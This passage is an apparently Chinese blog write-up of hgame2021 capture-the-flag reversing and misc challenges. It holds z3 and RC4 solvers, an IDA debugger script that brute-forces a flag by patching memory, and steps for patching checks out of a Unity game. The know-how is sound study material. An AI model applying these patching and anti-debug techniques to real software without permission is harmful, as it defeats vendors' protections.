class="number">100</span> * flag[<span class="number">33</span>] + <span class="number">95</span> * flag[<span class="number">34</span>] + <span class="number">83</span> * flag[<span class="number">35</span>] == <span class="number">50517</span>)</span><br><span class="line">solver.add(<span class="number">97</span> * flag[<span class="number">30</span>] + <span class="number">70</span> * flag[<span class="number">31</span>] + <span class="number">108</span> * flag[<span class="number">32</span>] + <span class="number">111</span> * flag[<span class="number">33</span>] + <span class="number">107</span> * flag[<span class="number">34</span>] + <span class="number">77</span> * flag[<span class="number">35</span>] == <span class="number">48421</span>)</span><br><span class="line">solver.add(<span class="number">109</span> * flag[<span class="number">30</span>] + <span class="number">65</span> * flag[<span class="number">31</span>] + <span class="number">97</span> * flag[<span class="number">32</span>] + <span class="number">95</span> * flag[<span class="number">33</span>] + <span class="number">111</span> * flag[<span class="number">34</span>] + <span class="number">67</span> * flag[<span class="number">35</span>] == <span class="number">46143</span>)</span><br><span class="line">solver.add(<span class="number">101</span> * flag[<span class="number">30</span>] + <span class="number">75</span> * flag[<span class="number">31</span>] + <span class="number">103</span> * flag[<span class="number">32</span>] + <span class="number">89</span> * flag[<span class="number">33</span>] + <span class="number">110</span> * flag[<span class="number">34</span>] + <span class="number">63</span> * flag[<span class="number">35</span>] == <span class="number">46102</span>)</span><br><span class="line">solver.add(<span class="number">123</span> * flag[<span class="number">30</span>] + <span class="number">69</span> * flag[<span class="number">31</span>] + <span class="number">33</span> * flag[<span class="number">32</span>] + <span class="number">48</span> * flag[<span class="number">33</span>] + <span class="number">119</span> * flag[<span class="number">34</span>] + <span class="number">125</span> * flag[<span class="number">35</span>] == <span class="number">46744</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">result = solver.model()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(result[flag[i]].as_long()), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;E@sy_Se1f-Modifying_C0oodee33&#125;</span></span><br></pre></td></tr></table></figure><br><h4 id="helloRe3"><a href="#helloRe3" class="headerlink" title="helloRe3"></a>helloRe3</h4><blockquote><p>分值：350pts</p><p>描述：开发者留下了调试信息，会不会有用呢？ 试试DbgView。</p></blockquote><p>Alt +T 搜索 <code>input length</code>，来到 sub_1400C8BD0，0x1400C8CBF 处调用加密函数 sub_14008BC07 对输入序列进行加密，该函数是典型的 RC4，解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">&quot;63 80 04 F0 D3 D6 62 D0 D8 3C 76 C5 93 14 CF BC 3A 05 F4 6C&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">res = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> res]</span><br><span class="line">table = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x14</span>):</span><br><span class="line">table.append(res[i] ^ <span class="number">0x15</span>)</span><br><span class="line"></span><br><span class="line">order = <span class="built_in">range</span>(<span class="number">21</span>, <span class="number">33</span>) + <span class="built_in">range</span>(<span class="number">37</span>, <span class="number">50</span>) + <span class="built_in">range</span>(<span class="number">54</span>, <span class="number">65</span>) + <span class="built_in">range</span>(<span class="number">66</span>, <span class="number">76</span>)</span><br><span class="line">char = <span class="string">r&quot;1234567890-+qwertyuiop&#123;&#125;|asdfghjkl;&#x27;zxcvbnm,./&quot;</span>.upper()</span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(order)):</span><br><span class="line">dic[order[i]] = char[i]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">target = <span class="string">&quot;4D AF 27 AD E1 EC 6D DA F0 31 5E 9A 9E 29 FA BE 6B 08 C8 49&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> target]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x14</span>):</span><br><span class="line">o = target[i] ^ table[i]</span><br><span class="line">flag += dic[o]</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc"></a>Misc</h3><h4 id="A-R-K"><a href="#A-R-K" class="headerlink" title="A R K"></a>A R K</h4><blockquote><p>分值：250pts</p><p>描述：星藏点雪 月隐晦明 以夕为墨 泼雪作屏</p><p>hint：明日方舟是一款塔防游戏，可以将可部署单位放置在场地中。并且具有自律功能，可以记录部署的操作。翻译：没用 没用 出题人用可部署单位画了个东西 背景是白色的</p></blockquote><p>首先通过后面部分的 FTP 流量获得 CS 交互的 ssl.log，导入 wireshark 解密 TLS 流量：</p><p><img src="../img/hgame2021/17.png" alt="hgame2021"></p><p>导出 http 对象，在 getBattleReplay json 文件中，battleReplay 的值为一长串 base64。解码后得到一个 zip，但是开头是 <code>50 4B 05 06</code>，改为 <code>50 4B 03 04</code>，解压得到文件 default_entry，其中记录了很多单位的 xy 坐标，使用脚本提取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;default_entry&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = json.load(f)</span><br><span class="line">logs = data[<span class="string">&quot;journal&quot;</span>][<span class="string">&quot;logs&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;points.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> g:</span><br><span class="line"><span class="keyword">for</span> log <span class="keyword">in</span> logs:</span><br><span class="line">pos = log[<span class="string">&quot;pos&quot;</span>]</span><br><span class="line">g.write(<span class="string">&quot;%s %s \n&quot;</span> % (pos[<span class="string">&quot;row&quot;</span>], pos[<span class="string">&quot;col&quot;</span>]))</span><br></pre></td></tr></table></figure><p>再用 gnuplot 绘制，得到一个二维码，扫码得到 flag <code>hgame&#123;Did_y0u_ge7_Dusk?&#125;</code></p><br><h4 id="A-R-C"><a href="#A-R-C" class="headerlink" title="A R C"></a>A R C</h4><blockquote><p>分值：350pts</p><p>描述：</p><p>​    Akira虽然不玩🐍，但有些东西成功引起了他的注意。</p><p>hint：</p><p>​    hint1: 8558应该理解成85和58，BV号是___所以图片里的是___<br>​    hint2: 用tables而不是table，是因为字体是用来对照图片里字符串的内容的算一个table，而这个字体表示的东西也是一个table。<strong>注意本字体的i和j，I(0x49)和l(0x6C)有点相似</strong><br>​    hint3: 用了某种ROT的范围，但是位移不一样。词频分析是个好东西，别忘了视频里的问题。<br>​    hint4: 有的东西可以参考Crypto WEEK-1 第一题。<br>​    hint5: / 不是可输入的意思，是网站路径</p></blockquote><p>8558.png 中的字符串摘取下来，base85 解码得到 BV 号编码的 table（BV 号基于 base58），从 <a href="https://www.zhihu.com/question/381784377/answer/1099438784">知乎</a> 上找来 mcfx 大佬的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;BK0ICG]Qr*88_$gC,&#x27;-j2+KH86?Q\&quot;%928;LG@O*!Am0+`;E7iV2agSE&lt;c&#x27;U;6Yg^#H?!YBAQ]&quot;</span></span><br><span class="line">table = base64.a85decode(string).decode()</span><br><span class="line"></span><br><span class="line">tr=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">58</span>):</span><br><span class="line">tr[table[i]]=i</span><br><span class="line">s=[<span class="number">11</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>]</span><br><span class="line">xor=<span class="number">177451812</span></span><br><span class="line">add=<span class="number">8728348608</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">x</span>):</span></span><br><span class="line">r=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">r+=tr[x[s[i]]]*<span class="number">58</span>**i</span><br><span class="line"><span class="keyword">return</span> (r-add)^xor</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">x</span>):</span></span><br><span class="line">x=(x^xor)+add</span><br><span class="line">r=<span class="built_in">list</span>(<span class="string">&#x27;BV1  4 1 7  &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">r[s[i]]=table[x//<span class="number">58</span>**i%<span class="number">58</span>]</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(r)</span><br><span class="line"><span class="built_in">print</span>(enc(<span class="number">10001540</span>))</span><br><span class="line"><span class="comment"># BV17f411J77h</span></span><br></pre></td></tr></table></figure><p>得到 7z 密码，解压得到一个视频和 Fragments.txt，视频中的问题百度一下得到答案 42，所以视频里的两行字符串应该与 rot42 有关。多次测试后，发现第一行分为前后两段，前半段 <code>#)+F7IIMEH:?I</code> 是 rot42，后半段 <code>njiikffi</code> 是 rot47，解密后拼接起来得到 <code>MSUpasswordis:6557225</code></p><p>使用 VirtualDub + MSU 插件（去年的题目也用到了这俩），从 mkv 中提取出一个 txt，得到一个网址和用户名密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arc.hgame2021.cf</span><br><span class="line">Hikari</span><br><span class="line">Tairitsu</span><br></pre></td></tr></table></figure><p>访问网址，输入用户名密码，页面中只有一个斜杠代表网站根路径：</p><p><img src="../img/hgame2021/18.png" alt="hgame2021"></p><p>脚本处理 Fragments.txt 中的内容（也是 rot42 和 rot47）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s1 = <span class="string">&quot;&quot;&quot;zB7= ?I DEJ &gt;;H;` 8KJ &#125; MH?J; ?J 8;97KI; OEK C7O D;;: CEH; MEH:I JE 7D7BOI?I M&gt;7J ;D9E:?D= J&gt;; B?D;e ?Ib</span></span><br><span class="line"><span class="string">zEH B?D;f` \&quot;?A? &gt;7I JEB: OEK M&gt;7J ?J ?I` 7D: uA?H7 ?I D;9;II7HO JE :E ?Jb</span></span><br><span class="line"><span class="string">*ME OEKD= =?HBI ;NFBEH; 7 I&gt;7JJ;H;: MEHB:` &lt;?BB;: M?J&gt; IEKD:n 7 F7IJ JE 8; KD9EL;H;:bbb</span></span><br><span class="line"><span class="string">y79&gt; 7M7A;DI ?D J&gt;?I 8B7DA` HK?Da:EJJ;: MEHB: JE :?I9EL;H J&gt;7J I&gt;; ?I ;GK7BBO 8B7DA` H;C;C8;H?D= DEJ&gt;?D= E&lt; M&gt;7J 97C; 8;&lt;EH;b</span></span><br><span class="line"><span class="string">uD: J&gt;;D J&gt;;O C7A; 7 I;9ED: :?I9EL;HOn J&gt;; uH97;7` CKBJ?JK:;I E&lt; &lt;BE7J?D= =B7IIaB?A; I&gt;7H:I 9EDJ7?D?D= L?L?: C;CEH?;I E&lt; J&gt;; F7IJb&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line"><span class="keyword">if</span> s1[i] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27; \n&#x27;</span>:</span><br><span class="line"><span class="keyword">if</span> s1[i] &gt;= <span class="string">&#x27;`&#x27;</span>:</span><br><span class="line">tmp = <span class="built_in">ord</span>(s1[i]) - <span class="number">52</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tmp = <span class="built_in">ord</span>(s1[i]) + <span class="number">42</span></span><br><span class="line">s += <span class="built_in">chr</span>(tmp)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> s1[i] == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">s += <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">s += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag is not here, but I write it because you may need more words to analysis what encoding the line1 is.</span><br><span class="line">For line2, Liki has told you what it is, and Akira is necessary to do it.</span><br><span class="line">Two young girls explore a shattered world, filled with sound: a past to be uncovered...</span><br><span class="line">Each awakens in this blank, ruin-dotted world to discover that she is equally blank, remembering nothing of what came before.</span><br><span class="line">And then they make a second discovery: the Arcaea, multitudes of floating glass-like shards containing vivid memories of the past.</span><br></pre></td></tr></table></figure><p>对于视频中第二行字符串，根据 hint，需要用到 Crypto WEEK-1 第一题用过的维吉尼亚密码，密文是 <code>pwbvmpoakiscqdobil</code> 密钥是 <code>Akira</code>，解密得到 <code>pmtempestissimobyd</code>，访问 <code>arc.hgame2021.cf/pmtempestissimobyd</code> 得到 flag：</p><p><img src="../img/hgame2021/19.png" alt="hgame2021"></p><br><h4 id="accuracy"><a href="#accuracy" class="headerlink" title="accuracy"></a>accuracy</h4><blockquote><p>分值：350pts</p><p>描述：石碑上的文字,究竟隐藏着怎样的秘密……</p></blockquote><p>考的人工智能，需要训练一个模型来识别所有的图片然后提交字符串，官方说准确率到 95 就给 flag。我用 imageai 库训练了 10 个小时，得到的模型却并不理想，于是就放弃了。看官方 wp 别人手撸了神经网络，告辞！</p><br><h2 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h2><h3 id="Re-3"><a href="#Re-3" class="headerlink" title="Re"></a>Re</h3><h4 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h4><blockquote><p>分值：450pts</p><p>描述：ovm++ hates debugger</p></blockquote><p>类构造函数 sub_140001640 初始化虚拟机的指令和数据。构造函数 sub_140001610 调用 sub_14000128F 将进程加入一个 Job 中（可以理解为沙箱），防止调试器附加（不过如果是调试启动的话就没有影响了）</p><p>查字符串 <code>Welcome to ovm++!</code> 的交叉引用来到 main 函数，流程比较简单：</p><p><img src="../img/hgame2021/20.png" alt="hgame2021"></p><p>run_vm 函数就在运行虚拟机改变输入了，但是我不想去理解这个虚拟机的操作了。在动调的时候发现 case22 每次只修改输入的一个字符，而且运算结果与其他位置的字符无关，所以就写了个 ida python 脚本来爆破 flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.printable</span><br><span class="line"><span class="comment"># Initialize flag as &quot;hgame&#123;&#x27;a&#x27;*27&#125;&quot;</span></span><br><span class="line">flag = [<span class="number">104</span>, <span class="number">103</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">123</span>] + [<span class="number">0x61</span>] * <span class="number">27</span> + [<span class="number">125</span>]</span><br><span class="line"><span class="comment"># Here&#x27;s the target array picked from IDA</span></span><br><span class="line">target = <span class="string">&quot;CF BF 80 3B F6 AF 7E 02 24 ED 70 3A F4 EB 7A 4A E7 F7 A2 67 17 F0 C6 76 36 E8 AD 82 2E DB B7 4F E6 09&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> target]</span><br><span class="line"></span><br><span class="line">image_base = <span class="number">0x7FF62DD90000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">5</span>, -<span class="number">1</span>):</span><br><span class="line">isFound = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(charset)):</span><br><span class="line"><span class="comment"># run_vm(): ret</span></span><br><span class="line">RunTo(image_base + <span class="number">0x3FC4</span>)</span><br><span class="line">GetDebuggerEvent(WFNE_SUSP, -<span class="number">1</span>)</span><br><span class="line">input_addr = Qword(image_base + <span class="number">0xE3A0</span>)</span><br><span class="line">bs = get_bytes(input_addr, <span class="number">34</span>)</span><br><span class="line"><span class="comment"># Check last trial</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(bs[i]) == target[i]:</span><br><span class="line"><span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Found [%d]: %s&quot;</span> % (i, charset[j]))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Found [%d]: %s&quot;</span> % (i, charset[j - <span class="number">1</span>]))</span><br><span class="line">isFound = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> isFound:</span><br><span class="line"><span class="comment"># Assign and patch input for next trial</span></span><br><span class="line">flag[i] = <span class="built_in">ord</span>(charset[j])</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">PatchByte(input_addr + k, flag[k])</span><br><span class="line"><span class="comment"># Reset regs</span></span><br><span class="line">PatchByte(image_base + <span class="number">0xE3A8</span>, <span class="number">0</span>)</span><br><span class="line">PatchByte(image_base + <span class="number">0xE3AD</span>, <span class="number">0</span>)</span><br><span class="line">PatchDword(image_base + <span class="number">0xE3A9</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># Set function param</span></span><br><span class="line">SetRegValue(image_base + <span class="number">0xE378</span>, <span class="string">&quot;rcx&quot;</span>)</span><br><span class="line">SetRegValue(input_addr, <span class="string">&quot;rdx&quot;</span>)</span><br><span class="line"><span class="comment"># Redo</span></span><br><span class="line">SetRegValue(image_base + <span class="number">0x3CC0</span>, <span class="string">&quot;rip&quot;</span>)</span><br><span class="line"><span class="comment"># If current char is found, still need to do things above</span></span><br><span class="line"><span class="keyword">if</span> isFound:</span><br><span class="line"><span class="comment"># So we can only &#x27;break&#x27; at here</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag))</span><br></pre></td></tr></table></figure><p>在 ida7.0 中设置好 Local Windows debugger，运行脚本就能爆出 flag 了：</p><p><img src="../img/hgame2021/21.png" alt="hgame2021"></p><br><h4 id="A-5-Second-Challenge"><a href="#A-5-Second-Challenge" class="headerlink" title="A 5 Second Challenge"></a>A 5 Second Challenge</h4><blockquote><p>分值：400pts</p><p>描述：</p><p>​    oops! 我不小心把一些不该泄露的文件也打包进去了，不过还好，有个 dll 被我提前动过了手脚，别想通过 ILSpy 一把梭了~！</p><p>hint：</p><p>​    hint 1: 这个扫雷甚至没做胜利判定，雷的位置就是 flag，多踩几局雷就能发现是二维码了 囧 </p><p>​    hint 2: il2cpp 中间文件（源码）已经直接给了，就不太需要用 il2cppdumper 这类工具去死怼 GameAssembly.dll 了 囧<br>​    hint 3: 动的手脚只是把某个函数 nop 掉了，那个 dll 还是有用的<br>（除非你想从内存里把 matrix 动调出来</p></blockquote><p>il2cpp 打包的 unity 游戏，用 IL2cppDumper 去怼 GameAssembly.dll。ida 加载 IL2cppDumper 的脚本，找到一个有意思的方法 <code>Brick::OnMouseUp</code>，这个方法就是在方块上抬起鼠标左键会调用的回调函数。函数会检查是否超时：</p><p><img src="../img/hgame2021/22.png" alt="hgame2021"></p><p>那就把它 nop 掉：</p><p><img src="../img/hgame2021/23.png" alt="hgame2021"></p><p>然后检查这个方块有没有雷，有雷就把游戏结束标志置为 1：</p><p><img src="../img/hgame2021/24.png" alt="hgame2021"></p><p>所以把 <code>isOver = 1</code> patch 成 0，让我们就算踩了雷也不会结束：<br><img src="../img/hgame2021/25.png" alt="hgame2021"></p><p>为了正确运行，还需要 patch <code>BombChecker::CheckBombAt</code>：</p><p><img src="../img/hgame2021/26.png" alt="hgame2021"></p><p>然后应用一下 patch，打开游戏把雷块都点开：</p><p><img src="../img/hgame2021/27.png" alt="hgame2021"></p><p>像不像一个二维码……然后👴是龙鸣，👴 <a href="https://merricx.github.io/qrazybox/">手点</a> 了一个 45*45 的二维码：</p><p><img src="../img/hgame2021/28.png" alt="hgame2021"></p><p>扫码得到 flag <code>hgame&#123;YOU~hEn-duO_yOU-X|~DOU-sHi~un1Ty~k4i-fA_de_O&#125;</code></p><br><h4 id="nllvm"><a href="#nllvm" class="headerlink" title="nllvm"></a>nllvm</h4><blockquote><p>分值：350pts</p><p>描述：cosmos掉入了异世界中，帮助cosmos回到现实……</p></blockquote><p>main 函数是 sub_1400105F0，其他没啥好说的，动调跟一下就能知道程序逻辑了，加密函数也不难（其实就是 AES，这里闲的没事我选择手撸），用 python 翻译加密函数就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">const_key = <span class="string">&quot;43 72 79 70 74 6F 46 41 49 4C 55 52 45 66 6F 72 52 53 41 32 30 34 38 4B 65 79 21 21 21 21 21 21 BF 8F 84 8D CB E0 C2 CC 82 AC 97 9E C7 CA F8 EC 94 27 00 FC A4 13 38 B7 C1 6A 19 96 E0 4B 38 B7 0E 88 2D 6C C5 68 EF A0 47 C4 78 3E 80 0E 80 D2 59 8C CD 49 FD 9F F5 FE 3C F5 EC 68 DC BE D4 DF A4 C0 B3 EA 61 A8 5C 4A 26 6C 24 74 A6 62 A4 A6 7D 26 84 6D 80 B9 71 93 BC 4C 9D FB 60 F2 49 24 25 FB 85 3A 44 53 D9 70 62 3F FD 04 C4 5D 59 A2 61 6A 4F 57 E1 D3 3E C4 5D 9F A3 3F 3D 6D EA 1B 09 7C 2A 1D 4D 2F F3 6D 2F 10 0E 69 EB 4D 57 CB 88 89 14 48 69 5A 2A 8C 34 C5 89 B3 09 A8 63 A8 EB 87 E8 1C A6 A8 1B 71 89 B8 15 18 62 F5 42 D3 22 6F 38 2E 4B 35 12 A2 7F F0 9B 11 76 58 F8 B9 C1 C6 BE 24 67 6E A5 55 EE D6 B0 4D 8C 23 F2 9E&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">const_key = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> const_key]</span><br><span class="line">table = <span class="string">&quot;63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76 CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0 B7 FD 93 26 36 3F F7 CC 34 A5 E5 F1 71 D8 31 15 04 C7 23 C3 18 96 05 9A 07 12 80 E2 EB 27 B2 75 09 83 2C 1A 1B 6E 5A A0 52 3B D6 B3 29 E3 2F 84 53 D1 00 ED 20 FC B1 5B 6A CB BE 39 4A 4C 58 CF D0 EF AA FB 43 4D 33 85 45 F9 02 7F 50 3C 9F A8 51 A3 40 8F 92 9D 38 F5 BC B6 DA 21 10 FF F3 D2 CD 0C 13 EC 5F 97 44 17 C4 A7 7E 3D 64 5D 19 73 60 81 4F DC 22 2A 90 88 46 EE B8 14 DE 5E 0B DB E0 32 3A 0A 49 06 24 5C C2 D3 AC 62 91 95 E4 79 E7 C8 37 6D 8D D5 4E A9 6C 56 F4 EA 65 7A AE 08 BA 78 25 2E 1C A6 B4 C6 E8 DD 74 1F 4B BD 8B 8A 70 3E B5 66 48 03 F6 0E 61 35 57 B9 86 C1 1D 9E E1 F8 98 11 69 D9 8E 94 9B 1E 87 E9 CE 55 28 DF 8C A1 89 0D BF E6 42 68 41 99 2D 0F B0 54 BB 16&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">table = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">n, a, b</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">a[<span class="number">4</span>*i+j] ^= b[<span class="number">16</span>*n+<span class="number">4</span>*i+j]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_table</span>(<span class="params">a</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">idx = a[<span class="number">4</span>*j+i]</span><br><span 